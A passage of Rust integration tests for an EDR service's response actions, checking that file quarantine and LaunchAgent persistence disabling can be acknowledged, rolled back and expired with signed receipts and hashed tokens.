            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing quarantine endpointDecision metadata"));
        assert_eq!(endpoint_decision["receiptFamily"], "response_execution");
        assert_eq!(
            endpoint_decision["decision"]["action"],
            serde_json::Value::String("quarantine_file".to_string())
        );
        assert_eq!(
            endpoint_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        assert!(endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing quarantine receipt evidence"))
            .iter()
            .any(|item| item["key"]
                .as_str()
                .is_some_and(|key| key.starts_with("executionEffect:"))));

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing quarantine execution id"));
        let response_action_id = payload["plan"]["actionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing quarantine response action id"));
        let receipts = read_endpoint_receipt_ledger(&receipt_path)
            .unwrap_or_else(|err| panic!("failed to read quarantine receipt ledger: {err}"));
        assert!(
            receipts.iter().any(|receipt| {
                receipt_endpoint_decision_str(receipt, &["receiptFamily"])
                    == Some("response_execution")
                    && receipt_evidence_hash_matches(
                        receipt,
                        "responseActionId",
                        response_action_id,
                    )
                    && receipt_evidence_hash_matches(receipt, "executionStatus", "partial")
                    && receipt_evidence_hash_matches(
                        receipt,
                        "executionPhase",
                        "pre_effect_quarantine_file",
                    )
            }),
            "missing durable pre-effect quarantine execution receipt"
        );
        let body = serde_json::json!({
            "reason": "cancel quarantined file without restoring it"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/cancel"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build quarantine cancel request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("quarantine cancel request failed: {e}"));
        assert_eq!(response.status(), StatusCode::BAD_REQUEST);
        let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read quarantine cancel response: {e}"));
        let error = String::from_utf8(bytes.to_vec())
            .unwrap_or_else(|e| panic!("quarantine cancel response is not utf8: {e}"));
        assert!(error.contains("use rollback"));
        assert!(!source_path.exists());
        assert!(quarantine_path.is_file());

        let body = serde_json::json!({
            "acknowledgedBy": "operator:test",
            "note": "verified quarantine execution receipt",
            "control": {
                "responseActionId": "11111111-1111-4111-8111-111111111111",
                "deliveryId": "22222222-2222-4222-8222-222222222222",
                "targetKind": "endpoint",
                "targetId": "test-agent",
                "ackToken": "control-secret-ack-token",
                "status": "acknowledged",
                "resultingState": "quarantine_file:succeeded",
                "controlApiUrl": "http://127.0.0.1:1",
                "controlApiToken": "control-api-key"
            }
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/acknowledge"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build quarantine acknowledgement request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("quarantine acknowledgement request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read quarantine acknowledgement response: {e}"));
        let acknowledgement_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| {
                panic!("failed to decode quarantine acknowledgement response: {e}")
            });
        assert_eq!(
            acknowledgement_payload["acknowledgement"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            acknowledgement_payload["acknowledgement"]["acknowledgedBy"],
            "operator:test"
        );
        assert_eq!(
            acknowledgement_payload["acknowledgement"]["status"],
            "succeeded"
        );
        assert_eq!(
            acknowledgement_payload["acknowledgement"]["controlCorrelation"]["responseActionId"],
            "11111111-1111-4111-8111-111111111111"
        );
        assert_eq!(
            acknowledgement_payload["acknowledgement"]["controlCorrelation"]["deliveryId"],
            "22222222-2222-4222-8222-222222222222"
        );
        assert_eq!(
            acknowledgement_payload["acknowledgement"]["controlCorrelation"]["targetKind"],
            "endpoint"
        );
        assert_eq!(
            acknowledgement_payload["acknowledgement"]["controlCorrelation"]["targetId"],
            "test-agent"
        );
        let control_ack_token_hash = sha256(b"control-secret-ack-token").to_hex_prefixed();
        assert_eq!(
            acknowledgement_payload["acknowledgement"]["controlCorrelation"]["ackTokenHash"],
            control_ack_token_hash
        );
        assert_eq!(
            acknowledgement_payload["controlPostback"]["accepted"],
            serde_json::Value::Bool(false)
        );
        let postback_hash = acknowledgement_payload["controlPostback"]["errorHash"]
            .as_str()
            .or_else(|| acknowledgement_payload["controlPostback"]["responseHash"].as_str())
            .unwrap_or_else(|| panic!("missing control postback hash"));
        assert!(postback_hash.starts_with("0x"));
        let acknowledgement_json =
            serde_json::to_string(&acknowledgement_payload["acknowledgement"])
                .unwrap_or_else(|e| panic!("failed to serialize acknowledgement payload: {e}"));
        assert!(!acknowledgement_json.contains("control-secret-ack-token"));
        let full_acknowledgement_json = serde_json::to_string(&acknowledgement_payload)
            .unwrap_or_else(|e| panic!("failed to serialize full acknowledgement payload: {e}"));
        assert!(!full_acknowledgement_json.contains("control-api-key"));

        let acknowledgement_receipt: SignedReceipt = serde_json::from_value(
            acknowledgement_payload["receipt"].clone(),
        )
        .unwrap_or_else(|e| panic!("failed to decode quarantine acknowledgement receipt: {e}"));
        let acknowledgement_decision = acknowledgement_receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing acknowledgement endpointDecision metadata"));
        assert_eq!(
            acknowledgement_decision["receiptFamily"],
            "response_acknowledgement"
        );
        assert_eq!(
            acknowledgement_decision["actor"]["agentId"],
            "operator:test"
        );
        assert_eq!(
            acknowledgement_decision["actor"]["workloadId"],
            "endpoint-response-engine"
        );
        assert_eq!(acknowledgement_decision["actor"]["posture"], "unknown");
        assert_eq!(
            acknowledgement_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        assert!(acknowledgement_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing acknowledgement receipt evidence"))
            .iter()
            .any(|item| item["key"] == "acknowledgedStatus"));
        assert!(acknowledgement_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing acknowledgement receipt evidence"))
            .iter()
            .any(|item| item["key"]
                .as_str()
                .is_some_and(|key| key.starts_with("acknowledgementEffect:"))));
        assert!(acknowledgement_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing acknowledgement receipt evidence"))
            .iter()
            .any(|item| item["key"] == "controlResponseActionId"));
        assert!(acknowledgement_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing acknowledgement receipt evidence"))
            .iter()
            .any(|item| item["key"] == "controlDeliveryId"));
        assert!(acknowledgement_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing acknowledgement receipt evidence"))
            .iter()
            .any(|item| item["key"] == "controlAckTokenHash"
                && item["valueHash"].as_str() == Some(control_ack_token_hash.as_str())
                && item["rawValue"].is_null()));

        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/edr/response-acknowledgements?limit=10")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| {
                panic!("failed to build response acknowledgement list request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("response acknowledgement list request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read response acknowledgement list: {e}"));
        let list_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode response acknowledgement list: {e}"));
        assert_eq!(list_payload["count"], 1);
        assert_eq!(
            list_payload["acknowledgements"][0]["acknowledgement"]["acknowledgementId"],
            acknowledgement_payload["acknowledgement"]["acknowledgementId"]
        );
        assert_eq!(
            list_payload["acknowledgements"][0]["acknowledgement"]["controlCorrelation"]
                ["responseActionId"],
            "11111111-1111-4111-8111-111111111111"
        );

        let body = serde_json::json!({
            "reason": "restore quarantined test file"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build quarantine rollback request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("quarantine rollback request failed: {e}"));
        let rollback_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read quarantine rollback response: {e}"));
        assert_eq!(
            rollback_status,
            StatusCode::OK,
            "unexpected quarantine rollback response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let rollback_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode quarantine rollback response: {e}"));
        assert_eq!(
            rollback_payload["rollback"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            rollback_payload["rollback"]["effects"][0]["effectType"],
            "restore_quarantine_file"
        );
        assert_eq!(
            rollback_payload["rollback_transition"]["execution"]["status"],
            "rolled_back"
        );
        assert!(source_path.is_file());
        assert!(!quarantine_path.exists());
        assert_eq!(
            std::fs::read(&source_path)
                .unwrap_or_else(|e| panic!("failed to read restored file: {e}")),
            b"quarantine me"
        );

        let rollback_receipt: SignedReceipt =
            serde_json::from_value(rollback_payload["receipt"].clone())
                .unwrap_or_else(|e| panic!("failed to decode quarantine rollback receipt: {e}"));
        let rollback_decision = rollback_receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing rollback endpointDecision metadata"));
        assert_eq!(rollback_decision["receiptFamily"], "response_rollback");
        assert_eq!(
            rollback_decision["decision"]["action"],
            serde_json::Value::String("quarantine_file".to_string())
        );
        assert_eq!(
            rollback_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        assert!(rollback_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing rollback receipt evidence"))
            .iter()
            .any(|item| item["key"]
                .as_str()
                .is_some_and(|key| key.starts_with("rollbackEffect:"))));
        let transition_receipt: SignedReceipt =
            serde_json::from_value(rollback_payload["transition_receipt"].clone())
                .unwrap_or_else(|e| panic!("failed to decode rollback transition receipt: {e}"));
        let transition_decision = transition_receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing rollback transition endpointDecision metadata"));
        assert_eq!(transition_decision["receiptFamily"], "response_execution");
        assert_eq!(
            transition_decision["decision"]["title"],
            "Endpoint response action rolled back"
        );
        let rolled_back_hash = sha256(b"rolled_back").to_hex_prefixed();
        assert!(transition_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing rollback transition receipt evidence"))
            .iter()
            .any(|item| item["key"] == "executionStatus"
                && item["valueHash"].as_str() == Some(rolled_back_hash.as_str())));

        let rollback_lifecycle = {
            let ledger = state.edr_response_execution_ledger.lock().await;
            ledger
                .read_recent(20)
                .unwrap_or_else(|err| panic!("failed to read rollback lifecycle ledger: {err}"))
                .into_iter()
                .filter(|record| {
                    record.action_id == response_action_id
                        && record.rollback_ref
                            == payload["plan"]["rollbackRef"]
                                .as_str()
                                .unwrap_or_else(|| panic!("missing rollback ref"))
                })
                .map(|record| record.status)
                .collect::<Vec<_>>()
        };
        let pending_index = rollback_lifecycle
            .iter()
            .position(|status| *status == EndpointResponseExecutionStatus::RollbackPending)
            .unwrap_or_else(|| panic!("missing durable rollback intent before quarantine restore"));
        let rolled_back_index = rollback_lifecycle
            .iter()
            .position(|status| *status == EndpointResponseExecutionStatus::RolledBack)
            .unwrap_or_else(|| panic!("missing durable rolled-back transition"));
        assert!(
            pending_index < rolled_back_index,
            "rollback intent must be durable before terminal rollback transition"
        );

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build rolled-back proof request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("rolled-back proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read rolled-back proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected rolled-back proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode rolled-back proof response: {e}"));
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing rolled-back proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        assert_eq!(
            transition_receipts[0]["receipt"]["metadata"]["endpointDecision"]["decision"]["title"],
            "Endpoint response action rolled back"
        );
        assert_eq!(
            proof_payload["rollbackReceipts"]
                .as_array()
                .unwrap_or_else(|| panic!("missing rolled-back proof rollback receipts"))
                .len(),
            1
        );
        let rollback_transition_id = rollback_payload["rollback_transition"]["execution"]
            ["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing rollback transition execution id"));
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{rollback_transition_id}/acknowledge"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({
                    "acknowledgedBy": "operator:rollback-review",
                    "note": "verified rollback terminal transition",
                    "control": {
                        "responseActionId": "33333333-3333-4333-8333-333333333333",
                        "deliveryId": "44444444-4444-4444-8444-444444444444",
                        "targetKind": "endpoint",
                        "targetId": "test-agent",
                        "ackToken": "rolled-back-control-ack-token"
                    }
                })
                .to_string(),
            ))
            .unwrap_or_else(|e| panic!("failed to build rolled-back acknowledgement request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("rolled-back acknowledgement request failed: {e}"));
        let rolled_back_ack_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read rolled-back acknowledgement response: {e}"));
        assert_eq!(
            rolled_back_ack_status,
            StatusCode::OK,
            "unexpected rolled-back acknowledgement response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let rolled_back_ack_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| {
                panic!("failed to decode rolled-back acknowledgement response: {e}")
            });
        assert_eq!(
            rolled_back_ack_payload["acknowledgement"]["status"],
            "rolled_back"
        );
        assert_eq!(
            rolled_back_ack_payload["acknowledgement"]["controlCorrelation"]["ackStatus"],
            "rolled_back"
        );
        assert_eq!(
            rolled_back_ack_payload["acknowledgement"]["controlCorrelation"]["resultingState"],
            "rolled_back"
        );
        let rolled_back_ack_token_hash = sha256(b"rolled-back-control-ack-token").to_hex_prefixed();
        assert_eq!(
            rolled_back_ack_payload["acknowledgement"]["controlCorrelation"]["ackTokenHash"],
            rolled_back_ack_token_hash
        );
        let rolled_back_ack_receipt: SignedReceipt = serde_json::from_value(
            rolled_back_ack_payload["receipt"].clone(),
        )
        .unwrap_or_else(|e| panic!("failed to decode rolled-back acknowledgement receipt: {e}"));
        let rolled_back_ack_decision = rolled_back_ack_receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| {
                panic!("missing rolled-back acknowledgement endpointDecision metadata")
            });
        assert_eq!(
            rolled_back_ack_decision["decision"]["title"],
            "Endpoint response execution acknowledged: rolled_back"
        );
        assert!(rolled_back_ack_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing rolled-back acknowledgement receipt evidence"))
            .iter()
            .any(|item| item["key"] == "acknowledgedStatus"
                && item["valueHash"].as_str() == Some(rolled_back_hash.as_str())));
        assert!(rolled_back_ack_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing rolled-back acknowledgement receipt evidence"))
            .iter()
            .any(|item| item["key"] == "controlAckTokenHash"
                && item["valueHash"].as_str() == Some(rolled_back_ack_token_hash.as_str())
                && item["rawValue"].is_null()));

        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({"reason": "duplicate rollback"}).to_string(),
            ))
            .unwrap_or_else(|e| panic!("failed to build duplicate rollback request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("duplicate rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::CONFLICT);

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_expiration_rolls_back_quarantine_file() {
        let receipt_path = test_receipt_path();
        let execution_path = test_response_execution_path();
        let keypair = Keypair::from_seed(&[66u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-response-proof-chain-signer".to_string(),
            signer_public_key,
        }));
        state.edr_response_execution_ledger = Arc::new(Mutex::new(
            EndpointResponseExecutionLedger::open(execution_path.clone()).unwrap_or_else(|e| {
                panic!("failed to open response execution proof-chain ledger: {e}")
            }),
        ));
        let state = Arc::new(state);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/expire",
                post(agent_edr_response_execution_expire),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let source_path = std::env::temp_dir().join(format!(
            "clawdstrike-quarantine-expire-source-{}-{counter}.txt",
            std::process::id()
        ));
        std::fs::write(&source_path, b"expire restores me")
            .unwrap_or_else(|e| panic!("failed to write expiring quarantine source file: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-quarantine-expire-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: source_path.display().to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build expiring quarantine findings request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("expiring quarantine findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing expiring quarantine file graph node"))
        };

        let body = serde_json::json!({
            "action": "quarantine_file",
            "rootNodeId": file_node_id,
            "ttlSeconds": 1,
            "reason": "quarantine suspicious file until TTL expiration",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build expiring quarantine request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("expiring quarantine request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read expiring quarantine response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode expiring quarantine response: {e}"));
        assert_eq!(payload["execution"]["action"], "quarantine_file");
        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing expiring quarantine execution id"));
        assert!(!source_path.exists());
        let quarantine_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing expiring quarantine artifact path")),
        );
        assert!(quarantine_path.is_file());

        tokio::time::sleep(Duration::from_millis(1100)).await;

        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-executions/expire")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build quarantine expiration request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("quarantine expiration request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read quarantine expiration response: {e}"));
        let expiration_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode quarantine expiration response: {e}"));
        assert_eq!(expiration_payload["expired_count"], 0);
        assert_eq!(expiration_payload["rollback_count"], 1);
        assert_eq!(
            expiration_payload["rollback_transitions"][0]["execution"]["status"],
            "rolled_back"
        );
        assert_eq!(
            expiration_payload["rollback_transition_receipts"][0]["receipt"]["metadata"]
                ["endpointDecision"]["receiptFamily"],
            "response_execution"
        );
        assert_eq!(
            expiration_payload["rollback_transition_receipts"][0]["receipt"]["metadata"]
                ["endpointDecision"]["decision"]["title"],
            "Endpoint response action rolled back"
        );
        assert_eq!(
            expiration_payload["rollbacks"][0]["effects"][0]["effectType"],
            "restore_quarantine_file"
        );
        assert!(source_path.is_file());
        assert!(!quarantine_path.exists());
        assert_eq!(
            std::fs::read(&source_path).unwrap_or_else(|e| panic!(
                "failed to read restored expiring quarantine file: {e}"
            )),
            b"expire restores me"
        );
        assert_eq!(
            expiration_payload["rollback_receipts"][0]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_rollback"
        );

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build quarantine proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("quarantine proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read quarantine proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected quarantine proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode quarantine proof response: {e}"));
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing quarantine proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        let transition_decision =
            &transition_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(transition_decision["receiptFamily"], "response_execution");
        assert_eq!(
            transition_decision["decision"]["title"],
            "Endpoint response action rolled back"
        );
        assert_eq!(
            transition_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        let rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing quarantine proof rollback receipts"));
        assert_eq!(rollback_receipts.len(), 1);
        let rollback_decision = &rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(rollback_decision["receiptFamily"], "response_rollback");
        assert_eq!(
            rollback_decision["decision"]["action"],
            serde_json::Value::String("quarantine_file".to_string())
        );
        assert_eq!(
            rollback_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
        let _ = std::fs::remove_file(&execution_path);
    }

    #[tokio::test]
    async fn agent_edr_response_expiration_rolls_back_disable_persistence() {
        let receipt_path = test_receipt_path();
        let execution_path = test_response_execution_path();
        let keypair = Keypair::from_seed(&[88u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-disable-persistence-expiration-signer".to_string(),
            signer_public_key,
        }));
        state.edr_response_execution_ledger = Arc::new(Mutex::new(
            EndpointResponseExecutionLedger::open(execution_path.clone()).unwrap_or_else(|e| {
                panic!("failed to open disable persistence expiration ledger: {e}")
            }),
        ));
        let state = Arc::new(state);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/expire",
                post(agent_edr_response_execution_expire),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let launch_agents_dir = std::env::temp_dir().join(format!(
            "clawdstrike-launch-agent-expire-{}-{counter}/Library/LaunchAgents",
            std::process::id()
        ));
        std::fs::create_dir_all(&launch_agents_dir)
            .unwrap_or_else(|e| panic!("failed to create expiring launch agents dir: {e}"));
        let source_path = launch_agents_dir.join("com.example.expiring.plist");
        let launch_agent_bytes = br#"<?xml version="1.0"?><plist><dict><key>Label</key><string>com.example.expiring</string></dict></plist>"#;
        std::fs::write(&source_path, launch_agent_bytes)
            .unwrap_or_else(|e| panic!("failed to write expiring launch agent plist: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-persistence-expire-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::LaunchPersistence {
                path: source_path.display().to_string(),
                label: Some("com.example.expiring".to_string()),
                operation: FileOperation::Create,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build expiring persistence findings request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("expiring persistence findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing expiring persistence file graph node"))
        };

        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 1,
            "reason": "disable suspicious launch agent until TTL expiration",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build expiring disable persistence request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("expiring disable persistence request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read expiring disable persistence response: {e}")
            });
